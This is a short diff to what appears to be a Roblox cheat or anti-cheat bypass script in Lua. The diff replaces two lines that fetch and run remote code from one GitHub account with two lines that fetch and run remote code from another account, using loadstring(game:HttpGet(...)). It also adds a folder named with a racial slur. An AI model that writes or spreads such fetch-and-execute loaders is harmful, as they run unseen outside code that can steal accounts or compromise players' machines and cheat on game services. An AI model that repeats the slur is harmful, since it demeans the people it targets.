@@ -11,8 +11,8 @@ game:GetService'StarterGui':SetCore('SendNotification', {
   wait(2)
   --bypass
   game["?"].Value = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/venturesomes/hoopypass/main/main"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/venturesomes/hoopycammy/main/main"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TahShiesty/Durango/main/fordzz"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TahShiesty/Durango/main/fordjrz"))()
 
 local folder = Instance.new("Folder", game.StarterGui)
     folder.Name = "Nigger"
